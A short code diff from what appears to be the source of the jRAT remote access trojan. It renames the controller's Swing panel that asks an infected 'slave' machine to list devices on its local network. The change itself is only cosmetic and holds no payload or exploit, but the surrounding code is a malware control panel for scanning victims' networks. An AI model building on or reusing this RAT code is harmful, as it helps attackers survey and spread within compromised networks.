@@ -21,7 +21,7 @@ import pro.jrat.packets.outgoing.Packet71LocalNetworkDevices;
 
 
 @SuppressWarnings("serial")
-public class PanelControlLANComputers extends PanelControlParent {
+public class PanelControlLANScan extends PanelControlParent {
 	
 	private JTable table;
 	private DefaultTableModel model;
@@ -55,7 +55,7 @@ public class PanelControlLANComputers extends PanelControlParent {
 		label.setForeground(Color.red);
 	}
 
-	public PanelControlLANComputers(Slave sl) {
+	public PanelControlLANScan(Slave sl) {
 		super(sl);
 		
 		JScrollPane scrollPane = new JScrollPane();
@@ -69,7 +69,7 @@ public class PanelControlLANComputers extends PanelControlParent {
 				slave.addToSendQueue(new Packet71LocalNetworkDevices());
 			}
 		});
-		btnReloadList.setIcon(new ImageIcon(PanelControlLANComputers.class.getResource("/icons/update.png")));
+		btnReloadList.setIcon(new ImageIcon(PanelControlLANScan.class.getResource("/icons/update.png")));
 		
 		JButton btnClear = new JButton("Clear");
 		btnClear.addActionListener(new ActionListener() {
@@ -77,7 +77,7 @@ public class PanelControlLANComputers extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(new ImageIcon(PanelControlLANComputers.class.getResource("/icons/clear.png")));
+		btnClear.setIcon(new ImageIcon(PanelControlLANScan.class.getResource("/icons/clear.png")));
 		
 		progressBar = new JProgressBar();
 		progressBar.setIndeterminate(true);
